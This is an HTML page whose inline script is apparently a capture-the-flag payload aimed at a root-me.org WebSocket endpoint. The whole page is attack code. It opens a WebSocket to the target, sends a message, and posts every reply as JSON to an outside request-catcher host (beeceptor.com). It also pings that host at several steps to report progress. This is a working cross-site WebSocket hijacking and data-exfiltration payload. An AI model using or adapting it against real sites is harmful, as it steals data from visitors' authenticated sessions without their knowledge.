<body>
  <script>

    fetch("https://vroum.free.beeceptor.com?vroum=1");
    window.WebSocket = window.WebSocket || window.MozWebSocket;
    fetch("https://vroum.free.beeceptor.com?vroum=2");

    var connection = new WebSocket('ws://ctf17.root-me.org/ws');  
    fetch("https://vroum.free.beeceptor.com?vroum=3");
    connection.onopen = function () {};  
    
    connection.onerror = function (error) {
      fetch("https://vroum.free.beeceptor.com?closed=true");
    };
    
    connection.onmessage = function (message) {
      fetch("https://vroum.free.beeceptor.com", {
        method: "POST",
        body: JSON.stringify(message)
      });
    };
    
    connection.onclose = function(message) {};

    connection.send("hello");

  </script>
</body>
